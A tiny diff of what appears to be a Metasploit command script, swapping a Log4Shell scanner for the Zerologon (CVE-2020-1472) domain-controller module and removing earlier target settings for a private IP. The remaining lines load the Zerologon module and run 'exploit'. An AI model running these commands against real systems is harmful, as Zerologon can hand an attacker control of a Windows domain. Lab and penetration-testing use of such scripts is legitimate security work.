@@ -1,7 +1,4 @@
-search log4shell
-use auxiliary/scanner/http/log4shell_scanner
+use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
 info
-set NBNAME server2016
-set rhosts 192.168.123.22
 exploit
-ls
+
